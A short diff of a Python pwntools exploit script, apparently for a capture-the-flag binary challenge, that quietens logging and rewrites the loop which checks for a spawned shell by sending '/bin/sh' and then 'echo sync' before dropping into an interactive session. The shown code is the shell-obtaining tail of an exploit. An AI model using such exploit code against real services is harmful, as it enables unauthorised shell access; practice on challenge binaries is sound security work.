@@ -17,7 +17,7 @@ context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
 
 context.log_level = 'debug'
-#context.log_level = 100
+context.log_level = 100
 
 debug = 0
 if debug == 1:
@@ -123,11 +123,15 @@ def exploit():
     c.sendlineafter('$', '2')
     c.sendafter('Index:', '/bin/sh\0')
 
-
-    for i in range(3):
-        c.sendlineafter('\n', 'ls', timeout=1)
-        if c.recvline(timeout=1) == '':
-            continue
+    for i in range(10):
+        c.sendline('echo sync')
+        line = c.recvuntil('sync', timeout=1)
+        if line == b'' and i > 5:
+            print('qq')
+            raise EOFError
+        if i > 5:
+            print(line)
+            break
 
     c.interactive()
     c.close()
